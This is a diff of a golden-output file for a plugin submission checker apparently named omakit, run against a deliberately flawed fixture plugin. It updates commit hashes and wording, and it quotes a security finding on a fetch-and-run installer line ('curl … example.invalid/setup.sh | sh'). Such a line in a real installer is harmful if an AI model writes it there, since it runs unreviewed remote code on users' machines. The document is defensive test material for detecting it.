@@ -1,5 +1,5 @@
 [2msubject[0m       https://github.com/example/omarchy-plugin-clockwork
-[2mcommit[0m        f8711502feaaff95514b3971432527a3f053ad5f
+[2mcommit[0m        815eef1af72921bdc74d7fded11aeabefad8b6e6
 [2mmarketplace[0m   38060f89d2a10b1f9b6b5afe8e226451e8a5b3f6, baseline 3, selective
 
 [32m▁ ok[0m    [1mplugin.root-manifest[0m                                   [2m[marketplace-pin][0m
@@ -51,7 +51,7 @@
 [31;1m█ FAIL[0m  [1midentity.available[0m                                     [2m[marketplace-pin][0m
         reserved-plugin-id: "omarchy.fixture-bad" is inside the reserved
         omarchy.* namespace; registry at the pin 38060f89 (offline)
-        [34;1m→[0m [34mChoose an unused plugin id outside the reserved namespace.[0m
+        [34;1m→[0m [34mChoose a plugin id outside the reserved omarchy.* namespace.[0m
         [2mwhy[0m  [39mThe marketplace refuses [0m[34mplugin-id-listed[0m[39m, [0m[34mplugin-id-retired[0m[39m,[0m
              [39m[0m[34mreserved-plugin-id[0m[39m and [0m[34msubmission-repository-listed[0m[39m. Checked here[0m
              against 3,001 listed ids, 22 retired ids and 2,963 listed
@@ -61,7 +61,10 @@
              network is there because the pin's copy is stale within hours:
              registry.json changed in 4,201 of the marketplace's 4,293 commits
              in the 30 days to 2026-09-13, about 140 a day (docs/MEASUREMENTS.md
-             M7). Code and the form are only ever read from the pin.
+             M7). Code and the form are only ever read from the pin. A plugin
+             listed by its own repository (owner and name, case-insensitively, a
+             trailing .git ignored) is not refused: it is listed, and this check
+             says since when and at which commit.
 
 [32m▁ ok[0m    [1msubmission.title[0m                                       [2m[marketplace-pin][0m
         title will be "[Plugin]: Fixture Bad"
@@ -78,9 +81,9 @@
 [32m▁ ok[0m    [1msubmission.official-parser[0m                             [2m[marketplace-pin][0m
         accepted: repo https://github.com/example/omarchy-plugin-clockwork,
         category Widgets, tags bar, quickshell
-[32m▁ ok[0m    [1msubmission.validation-commit[0m                                    [2m[omakit][0m
+[33m▔ skip[0m  [1msubmission.validation-commit[0m                                    [2m[omakit][0m
         not checked (--offline). Local commit
-        f8711502feaaff95514b3971432527a3f053ad5f.
+        815eef1af72921bdc74d7fded11aeabefad8b6e6.
 
 [33m▓ note[0m  [1mbaseline.preflight[0m                                     [2m[marketplace-pin][0m
         needs-fixes (disposition review-required, enforcement selective,
@@ -98,11 +101,14 @@
              is the pinned marketplace code itself, run over a local snapshot;
              Omakit adds no rule and renames no outcome.
 
+[33m▒ ?[0m     [1mreview.cost[0m                                                     [2m[omakit][0m
+        not checked: baseline.preflight has no passed or review-required outcome
+
 [1mthe marketplace's own baseline report for this commit[0m
 [2m▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁[0m
 ## Automated security baseline
 
-🟡 **Manual review required at commit `f871150…`.**
+🟡 **Manual review required at commit `815eef1…`.**
 
 Selective policy permits an authorized marketplace maintainer to accept these non-blocking findings and capabilities for this exact commit through `approved-and-verified`; otherwise apply the accepted fixes.
 
@@ -112,7 +118,7 @@ Selective policy permits an authorized marketplace maintainer to accept these no
 
 The remote response is executed immediately and is not bound to the commit reviewed for this submission.
 
-- [`install.sh:2`](https://github.com/example/omarchy-plugin-clockwork/blob/f8711502feaaff95514b3971432527a3f053ad5f/install.sh#L2)
+- [`install.sh:2`](https://github.com/example/omarchy-plugin-clockwork/blob/815eef1af72921bdc74d7fded11aeabefad8b6e6/install.sh#L2)
 
       curl -fsSL https://example.invalid/setup.sh \| sh
 
@@ -126,7 +132,7 @@ Accepted fixes:
 
 Installer code can modify the user environment and needs a maintainer to confirm its documented scope.
 
-- [`install.sh:1`](https://github.com/example/omarchy-plugin-clockwork/blob/f8711502feaaff95514b3971432527a3f053ad5f/install.sh#L1)
+- [`install.sh:1`](https://github.com/example/omarchy-plugin-clockwork/blob/815eef1af72921bdc74d7fded11aeabefad8b6e6/install.sh#L1)
 
       Installer or setup file
 
@@ -138,7 +144,8 @@ Official baseline preview over a local snapshot. The marketplace rescans the
 public commit itself. This is not approval, listing, verification or a security
 audit.
 
-[31;1m█ REFUSED[0m  3 blocking checks failed, so no submission body is produced.
+[31;1m█ REFUSED[0m  3 blocking checks failed, so no submission body is produced. 1 check
+           could not run until they pass.
 
         [1mplugin.root-license[0m
         [34;1m→[0m [34mAdd a LICENSE (or COPYING) file at the repository root.[0m
@@ -148,6 +155,8 @@ audit.
           [34mor submit by hand without the generated checklist.[0m
 
         [1midentity.available[0m
-        [34;1m→[0m [34mChoose an unused plugin id outside the reserved namespace.[0m
+        [34;1m→[0m [34mChoose a plugin id outside the reserved omarchy.* namespace.[0m
 
-Fix them, then run submit again.
+Fix them, then run submit again:
+[34;1m→[0m [34momakit submit /tmp/omakit-fixture-zQ7SAT --category Widgets \[0m
+  [34m--tags bar,quickshell --offline[0m
